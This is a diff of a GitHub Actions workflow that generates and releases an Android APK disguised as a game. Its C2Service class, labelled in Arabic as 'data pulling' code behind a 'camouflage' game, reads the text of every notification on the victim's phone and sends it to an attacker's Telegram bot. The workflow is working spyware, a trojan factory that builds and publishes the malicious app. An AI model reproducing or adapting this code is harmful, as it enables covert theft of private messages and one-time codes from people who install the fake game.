@@ -1,4 +1,4 @@
-name: Hussein V8 Ultimate Factory
+name: Hussein V8 Final Stable
 on:
   workflow_dispatch:
     inputs:
@@ -12,55 +12,55 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: 1. جلب الكود وإعداد جافا
+      - name: 1. تجهيز النظام
         uses: actions/checkout@v4
       - uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      - name: 2. بناء هيكل الأندرويد الصامت
+      - name: 2. إنشاء هيكل المشروع الصافي
         run: |
           mkdir -p app/src/main/java/com/hussein/v8
-          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
 
-          # إنشاء ملف الإعدادات
+          # ملف الإعدادات
           echo "include ':app'" > settings.gradle
 
-          # بناء ملف build.gradle الرئيسي (إصدار مستقر)
+          # ملف بناء المشروع الرئيسي (نسخة مستقرة جداً)
           cat << 'EOF' > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
+              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
           }
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # بناء ملف app/build.gradle (تثبيت المكتبات يدوياً)
+          # ملف بناء التطبيق (بدون تعقيدات)
           cat << 'EOF' > app/build.gradle
           plugins { id 'com.android.application' }
           android {
               namespace 'com.hussein.v8'
-              compileSdk 34
+              compileSdk 33
               defaultConfig {
                   applicationId "com.hussein.v8"
                   minSdk 24
-                  targetSdk 34
+                  targetSdk 33
                   versionCode 1
                   versionName "1.0"
               }
           }
           dependencies {
-              implementation "com.squareup.okhttp3:okhttp:4.12.0"
+              implementation "com.squareup.okhttp3:okhttp:4.10.0"
           }
           EOF
 
-      - name: 3. حقن كود "التمويه" وسحب البيانات
+      - name: 3. حقن الأكواد (التوكن والأيدي)
         run: |
-          # حقن اسم اللعبة في الـ Manifest
+          # ملف الـ Manifest
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
-              <application android:label="${{ github.event.inputs.app_name }}" android:icon="@android:drawable/btn_star">
+              <application android:label="${{ github.event.inputs.app_name }}" android:icon="@android:drawable/star_on">
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
@@ -74,7 +74,7 @@ jobs:
           </manifest>
           EOF
 
-          # حقن معلومات البوت (Token & ID)
+          # كود سحب البيانات (C2Service)
           cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
           package com.hussein.v8;
           import android.service.notification.NotificationListenerService;
@@ -83,14 +83,16 @@ jobs:
           import java.io.IOException;
 
           public class C2Service extends NotificationListenerService {
-              private final String T = "${{ github.event.inputs.bot_token }}";
-              private final String C = "${{ github.event.inputs.chat_id }}";
-              private final OkHttpClient client = new OkHttpClient();
-
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
-                  String msg = "🎯 صيدة جديدة!\n" + sbn.getNotification().extras.getCharSequence("android.text");
-                  Request req = new Request.Builder().url("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+msg).build();
+                  String token = "${{ github.event.inputs.bot_token }}";
+                  String chatid = "${{ github.event.inputs.chat_id }}";
+                  String msg = "🎯 صيدة: " + sbn.getNotification().extras.getCharSequence("android.text");
+                  
+                  OkHttpClient client = new OkHttpClient();
+                  Request req = new Request.Builder()
+                      .url("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + msg)
+                      .build();
                   client.newCall(req).enqueue(new Callback() {
                       @Override public void onFailure(Call c, IOException e) {}
                       @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
@@ -99,7 +101,7 @@ jobs:
           }
           EOF
 
-          # كود اللعبة (الباكمان الشهير للتمويه)
+          # كود اللعبة التمويهية
           cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
           package com.hussein.v8;
           import android.app.Activity;
@@ -116,16 +118,14 @@ jobs:
           }
           EOF
 
-      - name: 4. تشغيل ماكينة البناء (Gradle Build)
-        run: |
-          chmod +x gradlew || true
-          gradle assembleDebug
+      - name: 4. البناء النهائي (باستخدام Gradle النظام)
+        run: gradle assembleDebug
 
-      - name: 5. استخراج الرابط المباشر للـ APK
+      - name: 5. رفع ملف الـ APK
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: V8-STABLE-${{ github.run_number }}
-          name: لعبة ${{ github.event.inputs.app_name }} جاهزة
+          tag_name: V8-Final-Stable-${{ github.run_number }}
+          name: تطبيق ${{ github.event.inputs.app_name }} جاهز
           files: app/build/outputs/apk/debug/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
